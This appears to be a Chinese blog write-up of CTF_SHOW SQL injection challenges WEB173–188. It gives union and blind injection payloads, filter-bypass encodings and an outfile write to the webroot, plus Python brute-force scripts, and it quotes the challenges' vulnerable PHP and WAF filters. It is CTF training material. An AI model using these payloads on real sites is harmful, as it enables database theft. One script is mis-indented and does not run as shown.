

<!DOCTYPE html>
<html lang="zh-CN" data-default-color-scheme=auto>



<head>
  <meta charset="UTF-8">
  <link rel="apple-touch-icon" sizes="76x76" href="/img/icon.png">
  <link rel="icon" href="/img/icon.png">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  
  <meta name="theme-color" content="#2f4154">
  <meta name="author" content="MiFuzz">
  <meta name="keywords" content="">
  
    <meta name="description" content="CTF_SHOW题目来自于CTF_SHOW的 web入门 WEB1731234567&#x2F;&#x2F;拼接sql语句查找指定ID用户$sql &#x3D; &quot;select id,username,password from ctfshow_user3 where username !&#x3D;&#39;flag&#39; and id &#x3D; &#39;&quot;.$_GET[&#39;id&#39;].&quot;&#39; limit 1;&quot;;&#x2F;检查结果是否有flag    if(!preg_">
<meta property="og:type" content="article">
<meta property="og:title" content="SQL注入">
<meta property="og:url" content="https://blog.dbii.top/posts/e73517db/index.html">
<meta property="og:site_name" content="MiFuzz&#39;s blog">
<meta property="og:description" content="CTF_SHOW题目来自于CTF_SHOW的 web入门 WEB1731234567&#x2F;&#x2F;拼接sql语句查找指定ID用户$sql &#x3D; &quot;select id,username,password from ctfshow_user3 where username !&#x3D;&#39;flag&#39; and id &#x3D; &#39;&quot;.$_GET[&#39;id&#39;].&quot;&#39; limit 1;&quot;;&#x2F;检查结果是否有flag    if(!preg_">
<meta property="og:locale" content="zh_CN">
<meta property="article:published_time" content="2024-03-16T14:11:16.000Z">
<meta property="article:modified_time" content="2024-03-16T14:14:00.212Z">
<meta property="article:author" content="MiFuzz">
<meta property="article:tag" content="ctf_show">
<meta name="twitter:card" content="summary_large_image">
  
  
  
  <title>SQL注入 - MiFuzz&#39;s blog</title>

  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />



  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />



<!-- 主题依赖的图标库，不要自行修改 -->
<!-- Do not modify the link that theme dependent icons -->

<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">



<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">


<link  rel="stylesheet" href="/css/main.css" />


  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
  
    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
  



  
<link rel="stylesheet" href="/css/gdt.css">



  <script id="fluid-configs">
    var Fluid = window.Fluid || {};
    Fluid.ctx = Object.assign({}, Fluid.ctx)
    var CONFIG = {"hostname":"blog.dbii.top","root":"/","version":"1.9.4","typing":{"enable":false,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"Markdown"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};

    if (CONFIG.web_analytics.follow_dnt) {
      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
    }
  </script>
  <script  src="/js/utils.js" ></script>
  <script  src="/js/color-schema.js" ></script>
  


  
<meta name="generator" content="Hexo 6.3.0">
<style>.github-emoji { position: relative; display: inline-block; width: 1.2em; min-height: 1.2em; overflow: hidden; vertical-align: top; color: transparent; }  .github-emoji > span { position: relative; z-index: 10; }  .github-emoji img, .github-emoji .fancybox { margin: 0 !important; padding: 0 !important; border: none !important; outline: none !important; text-decoration: none !important; user-select: none !important; cursor: auto !important; }  .github-emoji img { height: 1.2em !important; width: 1.2em !important; position: absolute !important; left: 50% !important; top: 50% !important; transform: translate(-50%, -50%) !important; user-select: none !important; cursor: auto !important; } .github-emoji-fallback { color: inherit; } .github-emoji-fallback img { opacity: 0 !important; }</style>
</head>


<body>
  

  <header>
    

<div class="header-inner" style="height: 70vh;">
  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
  <div class="container">
    <a class="navbar-brand" href="/">
      <strong>迷糊</strong>
    </a>

    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
            data-target="#navbarSupportedContent"
            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
      <div class="animated-icon"><span></span><span></span><span></span></div>
    </button>

    <!-- Collapsible content -->
    <div class="collapse navbar-collapse" id="navbarSupportedContent">
      <ul class="navbar-nav ml-auto text-center">
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/">
                <i class="iconfont icon-home-fill"></i>
                <span>首页</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/music/">
                <i class="iconfont icon-music"></i>
                <span>音乐</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/read/">
                <i class="iconfont icon-books"></i>
                <span>阅读</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/archives/">
                <i class="iconfont icon-archive-fill"></i>
                <span>归档</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/categories/">
                <i class="iconfont icon-category-fill"></i>
                <span>分类</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/about/">
                <i class="iconfont icon-user-fill"></i>
                <span>关于</span>
              </a>
            </li>
          
        
        
          <li class="nav-item" id="search-btn">
            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
              <i class="iconfont icon-search"></i>
            </a>
          </li>
          
        
        
          <li class="nav-item" id="color-toggle-btn">
            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
            </a>
          </li>
        
      </ul>
    </div>
  </div>
</nav>

  

<div id="banner" class="banner" parallax=true
     style="background: url('/img/flowerandbook.webp') no-repeat center center; background-size: cover;">
  <div class="full-bg-img">
    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
      <div class="banner-text text-center fade-in-up">
        <div class="h2">
          
            <span id="subtitle">SQL注入</span>
          
        </div>

        
          
  <div class="mt-3">
    
    
      <span class="post-meta">
        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
        <time datetime="2024-03-16 22:11" pubdate>
          2024年3月16日 晚上
        </time>
      </span>
    
  </div>

  <div class="mt-1">
    
      <span class="post-meta mr-2">
        <i class="iconfont icon-chart"></i>
        
          45k 字
        
      </span>
    

    
      <span class="post-meta mr-2">
        <i class="iconfont icon-clock-fill"></i>
        
        
        
          373 分钟
        
      </span>
    

    
    
  </div>


        
      </div>

      
    </div>
  </div>
</div>

</div>

  </header>

  <main>
    
      

<div class="container-fluid nopadding-x">
  <div class="row nomargin-x">
    <div class="side-col d-none d-lg-block col-lg-2">
      

    </div>

    <div class="col-lg-8 nopadding-x-md">
      <div class="container nopadding-x-md" id="board-ctn">
        <div id="board">
          <article class="post-content mx-auto">
            <!-- SEO header -->
            <h1 style="display: none">SQL注入</h1>
            
            
              <div class="markdown-body">
                
                <h2 id="CTF-SHOW"><a href="#CTF-SHOW" class="headerlink" title="CTF_SHOW"></a>CTF_SHOW</h2><p>题目来自于CTF_SHOW的 web入门</p>
<h3 id="WEB173"><a href="#WEB173" class="headerlink" title="WEB173"></a><a href="">WEB173</a></h3><figure class="highlight awk"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">//</span>拼接sql语句查找指定ID用户<br><span class="hljs-variable">$sql</span> = <span class="hljs-string">"select id,username,password from ctfshow_user3 where username !='flag' and id = '"</span>.<span class="hljs-variable">$_GET</span>[<span class="hljs-string">'id'</span>].<span class="hljs-string">"' limit 1;"</span>;<br><br>/检查结果是否有flag<br>    <span class="hljs-keyword">if</span>(!preg_match(<span class="hljs-string">'/flag/i'</span>, json_encode(<span class="hljs-variable">$ret</span>))){<br>      <span class="hljs-variable">$ret</span>[<span class="hljs-string">'msg'</span>]=<span class="hljs-string">'查询成功'</span>;<br>    }<br></code></pre></td></tr></tbody></table></figure>

<p>PY:</p>
<figure class="highlight n1ql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs n1ql">0' union <span class="hljs-keyword">select</span> id,<span class="hljs-built_in">replace</span>(username,<span class="hljs-string">'f'</span>,<span class="hljs-string">'g'</span>),<span class="hljs-keyword">password</span> <span class="hljs-keyword">from</span> ctfshow_user3 <span class="hljs-keyword">where</span> username = <span class="hljs-string">'flag</span><br></code></pre></td></tr></tbody></table></figure>

<p>KEY:</p>
<p>在 SQL 中，<code>REPLACE()</code> 是一个字符串函数，用于替换字符串中的指定子字符串。</p>
<p><code>REPLACE()</code> 函数的语法如下：</p>
<figure class="highlight reasonml"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs reasonml"><span class="hljs-constructor">REPLACE(<span class="hljs-params">string</span>, <span class="hljs-params">old_substring</span>, <span class="hljs-params">new_substring</span>)</span><br></code></pre></td></tr></tbody></table></figure>

<p>其中：</p>
<ul>
<li><code>string</code> 是要进行替换操作的源字符串。</li>
<li><code>old_substring</code> 是要被替换的子字符串。</li>
<li><code>new_substring</code> 是替换后的子字符串。</li>
</ul>
<p><code>REPLACE()</code> 函数会在 <code>string</code> 字符串中查找所有出现的 <code>old_substring</code> 子字符串，并将其替换为 <code>new_substring</code>。如果 <code>string</code> 中存在多个 <code>old_substring</code> 子字符串，所有的 <code>old_substring</code> 都会被替换成 <code>new_substring</code>。</p>
<h3 id="WEB174"><a href="#WEB174" class="headerlink" title="WEB174"></a>WEB174</h3><figure class="highlight arcade"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs arcade"><span class="hljs-keyword">if</span>(!preg_match(<span class="hljs-string">'/flag|[0-9]/i'</span>, json_encode(<span class="hljs-symbol">$ret</span>))){<br>      <span class="hljs-symbol">$ret</span>[<span class="hljs-string">'msg'</span>]=<span class="hljs-string">'查询成功'</span>;<br>    }<br></code></pre></td></tr></tbody></table></figure>

<p>因为过滤了数字，因此可以利用下面的方式绕过，但是下面这个分得清flag原本的字母和数字吗？也许可以这样：replace(password,0,’numa’)</p>
<p>PY:</p>
<figure class="highlight pgsql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(<span class="hljs-keyword">password</span>,<span class="hljs-number">0</span>,<span class="hljs-string">'g'</span>),<span class="hljs-number">1</span>,<span class="hljs-string">'h'</span>),<span class="hljs-number">2</span>,<span class="hljs-string">'i'</span>),<span class="hljs-number">3</span>,<span class="hljs-string">'j'</span>),<span class="hljs-number">4</span>,<span class="hljs-string">'k'</span>),<span class="hljs-number">5</span>,<span class="hljs-string">'l'</span>),<span class="hljs-number">6</span>,<span class="hljs-string">'m'</span>),<span class="hljs-number">7</span>,<span class="hljs-string">'n'</span>),<span class="hljs-number">8</span>,<span class="hljs-string">'o'</span>),<span class="hljs-number">9</span>,<span class="hljs-string">'p'</span>)<br></code></pre></td></tr></tbody></table></figure>

<h3 id="WEB175"><a href="#WEB175" class="headerlink" title="WEB175"></a>WEB175</h3><figure class="highlight reasonml"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs reasonml"><span class="hljs-keyword">if</span>(!preg<span class="hljs-constructor">_match('<span class="hljs-operator">/</span>[\<span class="hljs-params">x00</span>-\<span class="hljs-params">x7f</span>]<span class="hljs-operator">/</span><span class="hljs-params">i</span>', <span class="hljs-params">json_encode</span>($<span class="hljs-params">ret</span>)</span>)){<br>      $ret<span class="hljs-literal">['<span class="hljs-identifier">msg</span>']</span>='查询成功';<br>    }<br></code></pre></td></tr></tbody></table></figure>

<p><code>/[\x00-\x7f]/i</code>：这是一个正则表达式模式，用于匹配 ASCII 字符范围内的字符。<code>\x00-\x7f</code> 表示 ASCII 字符的十六进制范围，即从 0x00（空字符）到 0x7f（DEL 字符）。</p>
<p>PY:</p>
<p>盲注是可行的，其次就是将查询结果写到文件中，然后访问文件即可，在没有多余的选择下，可以尝试一下：</p>
<figure class="highlight awk"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">-<span class="hljs-number">1</span><span class="hljs-string">' union select username,password from ctfshow_user5 into outfile '</span><span class="hljs-regexp">/var/</span>www<span class="hljs-regexp">/html/</span><span class="hljs-number">1</span>.txt<span class="hljs-string">'--+</span><br></code></pre></td></tr></tbody></table></figure>

<h3 id="WEB177"><a href="#WEB177" class="headerlink" title="WEB177"></a>WEB177</h3><figure class="highlight n1ql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs n1ql">$sql = "<span class="hljs-keyword">select</span> id,username,<span class="hljs-keyword">password</span> <span class="hljs-keyword">from</span> ctfshow_user <span class="hljs-keyword">where</span> username !=<span class="hljs-string">'flag'</span> <span class="hljs-keyword">and</span> id = <span class="hljs-string">'".$_GET['</span>id<span class="hljs-string">']."'</span> <span class="hljs-keyword">limit</span> <span class="hljs-number">1</span>;";<br></code></pre></td></tr></tbody></table></figure>

<p>此处应该是过滤了空格</p>
<figure class="highlight rust"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs rust">-<span class="hljs-number">1</span>'<span class="hljs-comment">/**/</span>or<span class="hljs-comment">/**/</span>username=<span class="hljs-symbol">'flag</span><br></code></pre></td></tr></tbody></table></figure>

<h3 id="WEB178"><a href="#WEB178" class="headerlink" title="WEB178"></a>WEB178</h3><p>过滤了空格和*等符号</p>
<figure class="highlight haml"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs haml"><span class="hljs-tag">%<span class="hljs-selector-tag">09</span></span>：水平制表符，Tab<br><span class="hljs-tag">%<span class="hljs-selector-tag">0b</span></span>：垂直制表符 Enter<br><span class="hljs-tag">%<span class="hljs-selector-tag">23</span></span>：#<br></code></pre></td></tr></tbody></table></figure>

<p>可以用回车和tab代替空格</p>
<p>PY:</p>
<figure class="highlight llvm"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs llvm"><span class="hljs-number">-1</span>'<span class="hljs-variable">%09</span>union<span class="hljs-variable">%09</span><span class="hljs-keyword">select</span><span class="hljs-variable">%091</span><span class="hljs-punctuation">,</span>username<span class="hljs-punctuation">,</span>password<span class="hljs-variable">%09</span>from<span class="hljs-variable">%09</span>ctfshow_user<span class="hljs-variable">%23</span><br>'<span class="hljs-keyword">or</span>'<span class="hljs-number">1</span>'<span class="hljs-operator">=</span>'<span class="hljs-number">1</span>'<span class="hljs-variable">%23</span><br></code></pre></td></tr></tbody></table></figure>

<p>题目难点就是找到过滤的点</p>
<h3 id="WEB179"><a href="#WEB179" class="headerlink" title="WEB179"></a>WEB179</h3><p>貌似过滤了空格，*,%0b,%09,但是%23，%0C可用：</p>
<figure class="highlight xquery"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs xquery"><span class="hljs-string">'or'</span><span class="hljs-number">1</span><span class="hljs-string">'='</span><span class="hljs-number">1</span><span class="hljs-string">'%23</span><br><span class="hljs-string">-1'</span><span class="hljs-keyword">union</span><span class="hljs-meta">%0cselect</span><span class="hljs-meta">%0c1</span>,<span class="hljs-number">2</span>,password<span class="hljs-meta">%0cfrom</span><span class="hljs-meta">%0cctfshow_user</span><span class="hljs-meta">%23</span><br></code></pre></td></tr></tbody></table></figure>

<h3 id="WEB180-182"><a href="#WEB180-182" class="headerlink" title="WEB180-182"></a>WEB180-182</h3><p>过滤了大部分内容，但是%0c可用，同时我发现在注释上，–+的空格可用用%01-%1f其中大部分来代替，但是其不能代替空格使用</p>
<figure class="highlight llvm"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs llvm"><span class="hljs-number">-1</span>'union<span class="hljs-variable">%0</span>cselect<span class="hljs-variable">%0</span><span class="hljs-keyword">c</span><span class="hljs-number">1</span><span class="hljs-punctuation">,</span><span class="hljs-number">2</span><span class="hljs-punctuation">,</span><span class="hljs-number">3</span>--<span class="hljs-variable">%02</span><br>'<span class="hljs-keyword">or</span>'<span class="hljs-number">1</span>'<span class="hljs-operator">=</span>'<span class="hljs-number">1</span>'--<span class="hljs-variable">%0</span><span class="hljs-keyword">c</span><br><br><span class="hljs-number">-1</span>'<span class="hljs-variable">%0</span>cor<span class="hljs-variable">%0</span>cusername<span class="hljs-variable">%0</span>clike<span class="hljs-variable">%0</span><span class="hljs-keyword">c</span>'flag<br><span class="hljs-number">-1</span>'<span class="hljs-variable">%0</span>cor<span class="hljs-variable">%0</span>cpassword<span class="hljs-variable">%0</span>clike<span class="hljs-variable">%0</span><span class="hljs-keyword">c</span>'ctf%<br></code></pre></td></tr></tbody></table></figure>

<p>PY4，5利用了SQL中的LIKE关键词：</p>
<figure class="highlight n1ql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs n1ql"><span class="hljs-keyword">select</span> id,username,<span class="hljs-keyword">password</span> <span class="hljs-keyword">from</span> ctfshow_user <span class="hljs-keyword">where</span> username !=<span class="hljs-string">'flag'</span> <span class="hljs-keyword">and</span> id = <span class="hljs-string">'-1'</span> <span class="hljs-keyword">or</span> <span class="hljs-keyword">password</span> <span class="hljs-keyword">like</span> <span class="hljs-string">'ctf%'</span> <span class="hljs-keyword">limit</span> <span class="hljs-number">1</span>;<br></code></pre></td></tr></tbody></table></figure>

<h4 id="WEB181"><a href="#WEB181" class="headerlink" title="WEB181"></a>WEB181</h4><figure class="highlight delphi"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs delphi">  <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">waf</span><span class="hljs-params">($str)</span><span class="hljs-comment">{</span></span><br><span class="hljs-comment"><span class="hljs-function">    return preg_match('/ |\*|\x09|\x0a|\x0b|\x0c|\x00|\x0d|\xa0|\x23|\#|file|into|select/i', $str);</span></span><br><span class="hljs-comment"><span class="hljs-function">  }</span></span><br><span class="hljs-function"></span><br><span class="hljs-function">空格 <span class="hljs-params">(<span class="hljs-string">' '</span>)</span></span><br><span class="hljs-function">星号 <span class="hljs-params">(<span class="hljs-string">'*'</span>)</span></span><br><span class="hljs-function">制表符 <span class="hljs-params">(<span class="hljs-string">'\x09'</span>)</span></span><br><span class="hljs-function">换行 <span class="hljs-params">(<span class="hljs-string">'\x0a'</span>)</span></span><br><span class="hljs-function">垂直制表符 <span class="hljs-params">(<span class="hljs-string">'\x0b'</span>)</span></span><br><span class="hljs-function">换页 <span class="hljs-params">(<span class="hljs-string">'\x0c'</span>)</span></span><br><span class="hljs-function">空字符 <span class="hljs-params">(<span class="hljs-string">'\x00'</span>)</span></span><br><span class="hljs-function">回车 <span class="hljs-params">(<span class="hljs-string">'\x0d'</span>)</span></span><br><span class="hljs-function">非断行空格 <span class="hljs-params">(<span class="hljs-string">'\xa0'</span>)</span></span><br><span class="hljs-function">井号 <span class="hljs-params">(<span class="hljs-string">'\x23'</span>)</span></span><br><span class="hljs-function"># 字符</span><br><span class="hljs-function"><span class="hljs-title">file</span> 字符串</span><br><span class="hljs-function"><span class="hljs-title">into</span> 字符串</span><br><span class="hljs-function"><span class="hljs-title">select</span> 字符串</span><br></code></pre></td></tr></tbody></table></figure>

<p>可以看到%0c依旧可用</p>
<h4 id="WEB182"><a href="#WEB182" class="headerlink" title="WEB182"></a>WEB182</h4><figure class="highlight reasonml"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs reasonml"><span class="hljs-keyword">function</span> waf($str){<br>   return preg<span class="hljs-constructor">_match('<span class="hljs-operator">/</span> |\<span class="hljs-operator">*</span>|\<span class="hljs-params">x09</span>|\<span class="hljs-params">x0a</span>|\<span class="hljs-params">x0b</span>|\<span class="hljs-params">x0c</span>|\<span class="hljs-params">x00</span>|\<span class="hljs-params">x0d</span>|\<span class="hljs-params">xa0</span>|\<span class="hljs-params">x23</span>|\#|<span class="hljs-params">file</span>|<span class="hljs-params">into</span>|<span class="hljs-params">select</span>|<span class="hljs-params">flag</span><span class="hljs-operator">/</span><span class="hljs-params">i</span>', $<span class="hljs-params">str</span>)</span>;<br> }<br></code></pre></td></tr></tbody></table></figure>

<h3 id="WEB183"><a href="#WEB183" class="headerlink" title="WEB183"></a>WEB183</h3><p>select count(pass) from ctfshow_user where(substr(pass,45,1))regexp(‘}’)</p>
<figure class="highlight fortran"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs fortran"><span class="hljs-keyword">SELECT</span> <span class="hljs-built_in">count</span>(<span class="hljs-keyword">pass</span>)：表示要选择计数（数量）的列是 <span class="hljs-keyword">pass</span> 列。<span class="hljs-built_in">count</span>() 是一个聚合函数，用于计算指定列中非空值的数量。<br>FROM ctfshow_user：表示要从名为 ctfshow_user 的表进行查询。这是指定要查询的表名。<br><span class="hljs-keyword">WHERE</span> (substr(<span class="hljs-keyword">pass</span>, <span class="hljs-number">45</span>, <span class="hljs-number">1</span>)) REGEXP <span class="hljs-string">'}'</span>：表示查询的条件。substr(<span class="hljs-keyword">pass</span>, <span class="hljs-number">45</span>, <span class="hljs-number">1</span>) 是一个字符串函数，用于提取 <span class="hljs-keyword">pass</span> 列中从第 <span class="hljs-number">45</span> 个字符开始的 <span class="hljs-number">1</span> 个字符。然后，使用 REGEXP 运算符与正则表达式 <span class="hljs-string">'}'</span> 进行匹配。REGEXP 是一个用于正则表达式匹配的操作符。<br></code></pre></td></tr></tbody></table></figure>

<p>PY:</p>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><br>url = <span class="hljs-string">'http://57496c50-1b0d-40de-ac22-501e93a1ddbd.chall.ctf.show/select-waf.php'</span><br>flagstr = <span class="hljs-string">r"{flqazwsxedcrvtgbyhnujmikolp-0123456789}"</span><br>res = <span class="hljs-string">""</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">46</span>):<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> flagstr:<br>        data = {<br>            <span class="hljs-string">'tableName'</span>: <span class="hljs-string">f"(ctfshow_user)where(substr(pass,<span class="hljs-subst">{i}</span>,1))regexp('<span class="hljs-subst">{j}</span>')"</span><br>        }<br>        r = requests.post(url, data=data)<br>        <span class="hljs-keyword">if</span> r.text.find(<span class="hljs-string">"$user_count = 1;"</span>) &gt; <span class="hljs-number">0</span>:<br>            res += j<br>            <span class="hljs-built_in">print</span>(res)<br>            <span class="hljs-keyword">break</span><br><br></code></pre></td></tr></tbody></table></figure>

<h3 id="WEB184"><a href="#WEB184" class="headerlink" title="WEB184"></a>WEB184</h3><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> time<br>flagstr = <span class="hljs-string">'{abcdefghijklmnopqrstuvwxyz-0123456789}'</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">str2hex</span>(<span class="hljs-params"><span class="hljs-built_in">str</span></span>):<br>        a = <span class="hljs-string">""</span><br>        <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">str</span>:<br>                a += <span class="hljs-built_in">hex</span>(<span class="hljs-built_in">ord</span>(x))<br>        <span class="hljs-keyword">return</span> a.replace(<span class="hljs-string">"0x"</span>,<span class="hljs-string">""</span>)<br>        flag = <span class="hljs-string">''</span><br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-number">40</span>):<br>            <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> flagstr:<br>                data = {<br>                    <span class="hljs-string">"tableName"</span>:<span class="hljs-string">"ctfshow_user group by pass having pass regexp(0x63746673686f77{})"</span>.<span class="hljs-built_in">format</span>(str2hex(flag+x))<br>                }<br>                response = requests.post(url,data=data)<br>                time.sleep(<span class="hljs-number">0.3</span>)<br>                <span class="hljs-keyword">if</span> response.text.find(<span class="hljs-string">"user_count = 1;"</span>)&gt;<span class="hljs-number">0</span>:<br>                    <span class="hljs-built_in">print</span>(<span class="hljs-string">"{} is right"</span>.<span class="hljs-built_in">format</span>(x))<br>                    flag+=x<br>                    <span class="hljs-keyword">break</span><br>                <span class="hljs-keyword">else</span>:<br>                    <span class="hljs-built_in">print</span>(<span class="hljs-string">"{} is wrong"</span>.<span class="hljs-built_in">format</span>(x))<br>                    <span class="hljs-keyword">continue</span><br>            <span class="hljs-built_in">print</span>(flag)<br></code></pre></td></tr></tbody></table></figure>

<h3 id="WEB188"><a href="#WEB188" class="headerlink" title="WEB188"></a>WEB188</h3><figure class="highlight awk"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs awk"> <span class="hljs-regexp">//</span>拼接sql语句查找指定ID用户<br> <span class="hljs-variable">$sql</span> = <span class="hljs-string">"select pass from ctfshow_user where username = {$username}"</span>;<br> <br><span class="hljs-regexp">//</span>密码判断<br> <span class="hljs-keyword">if</span>(<span class="hljs-variable">$row</span>[<span class="hljs-string">'pass'</span>]==intval(<span class="hljs-variable">$password</span>)){<br>     <span class="hljs-variable">$ret</span>[<span class="hljs-string">'msg'</span>]=<span class="hljs-string">'登陆成功'</span>;<br>     array_push(<span class="hljs-variable">$ret</span>[<span class="hljs-string">'data'</span>], array(<span class="hljs-string">'flag'</span>=&gt;<span class="hljs-variable">$flag</span>));<br>   }<br></code></pre></td></tr></tbody></table></figure>

<p>PY:</p>
<figure class="highlight apache"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">username</span>=<span class="hljs-number">1</span>&lt;<span class="hljs-number">1</span>&amp;password=<span class="hljs-number">0</span><br><span class="hljs-attribute">username</span>=<span class="hljs-number">0</span>&amp;password=<span class="hljs-number">0</span><br></code></pre></td></tr></tbody></table></figure>

<p>KEY:</p>
